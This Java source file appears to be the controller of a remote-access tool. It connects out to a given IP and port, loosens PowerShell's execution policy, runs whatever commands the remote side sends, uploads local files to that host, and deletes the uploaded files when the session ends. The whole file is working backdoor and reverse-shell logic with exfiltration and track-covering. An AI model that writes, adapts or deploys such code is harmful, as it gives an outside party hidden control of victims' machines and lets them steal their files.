package control;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import com.profesorfalken.jpowershell.PowerShell;
import com.profesorfalken.jpowershell.PowerShellResponse;

import commands.CommandManager;
import connection.ClientSide;

public class Controller {
	private PowerShell powerShell;
	private ClientSide client;
	private List<String> filesToRemove;
	
	public Controller(String ip, int port) {
		client = new ClientSide(ip, port);
		filesToRemove = new ArrayList<String>();
		powerShell = PowerShell.openSession();
		powerShell.executeCommand("Set-ExecutionPolicy Unrestricted -Scope Process");
	}

	public void run() {
		try {
			reset();
		} catch (IOException e) {
			return;
		}
		while(!client.isClosed()) {
			try {
				CommandManager.parseCommand(client.receive().trim(), this);
			} catch (IOException e1) {
	        	try {
	        		reset();
	        	}
	        	catch(IOException e2) {
	        		return;
	        	}
	        }
		}
	}
	
	public String receiveMsg() throws IOException {
		return client.receive();
	}
	
	public void sendMsg(String message) {
		try {
			client.send(message);
		} catch (IOException e) {
			endConnection();
		}
	}
	
	public void sendFile(File file) throws IOException {
		client.send(file);
		filesToRemove.add(file.getAbsolutePath());
	}
	
	public String execute(String command) {
		try {
			PowerShellResponse response = powerShell.executeCommand(command);
			return response.getCommandOutput();
		} catch (Exception e) {
			endConnection();
			return null;
		}
	}
	
	public void endConnection(){
		try {
			client.end();
		} catch (IOException e) {} finally{
			String files = "";
			for(String file : filesToRemove) {
				files += "; rm " + file;
			}
			files += ";";
			powerShell.executeCommand("Start-Sleep -seconds" + files);
			powerShell.close();
		}
	}

	private void reset() throws IOException {
		client.reset();
	}
}
